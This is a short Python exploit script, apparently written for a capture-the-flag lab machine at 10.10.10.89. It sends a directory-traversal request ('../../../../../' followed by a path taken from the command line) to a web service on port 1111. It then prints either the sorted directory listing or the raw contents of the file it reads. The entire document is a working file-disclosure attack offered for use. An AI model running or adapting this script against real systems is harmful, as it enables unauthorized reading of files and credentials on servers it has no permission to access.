#! /usr/bin/python
from pwn import * 
import sys
import requests

context.log_level = "info"
ls = []

r = requests.get("http://10.10.10.89:1111/../../../../../%s" % (sys.argv[1]))
if '<tr>' in r.text:
  for line in r.text.splitlines():
    if '<tr>' in line:
      ls.append(line.split('"')[1])
  for i in (sorted(ls)):
    print(i)
else:
  print r.text
